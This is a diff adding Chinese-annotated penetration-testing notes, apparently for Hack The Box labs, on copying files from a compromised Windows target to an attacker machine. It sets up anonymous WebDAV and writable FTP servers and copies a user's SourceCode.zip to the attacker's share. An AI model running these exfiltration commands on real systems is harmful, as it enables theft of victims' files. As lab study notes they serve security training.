@@ -76,6 +76,20 @@ echo <base64> | base64 -d -w 0 > hosts                                          
 md5sum hosts                                                                                      核对哈希
 
 
+SMB 从目标上传文件到攻击机
+sudo pip3 install wsgidav cheroot      安装 wsgidav
+  https://github.com/mar10/wsgidav     没通过 SMB 找到东西，它便用 HTTP
+sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous      在攻击机开启服务器
+C:\htb> dir \\192.168.49.128\DavWWWRoot                                 从目标连接到攻击机
+  注意：WebDAV 服务器上不存在 DavWWWRoot 文件夹，重定向到 WebDAV 服务器的根目录。
+  如果在连接服务器时指定一个服务器上已存在的文件夹，就可以避免使用此关键字。例如：\192.168.49.128\sharefolder
+C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\                              上传
+C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\                             上传
+
+
+FTP 从目标上传文件到攻击机
+sudo python3 -m pyftpdlib --port 21 --write      允许目标客户端文件上传
+
 
 
 
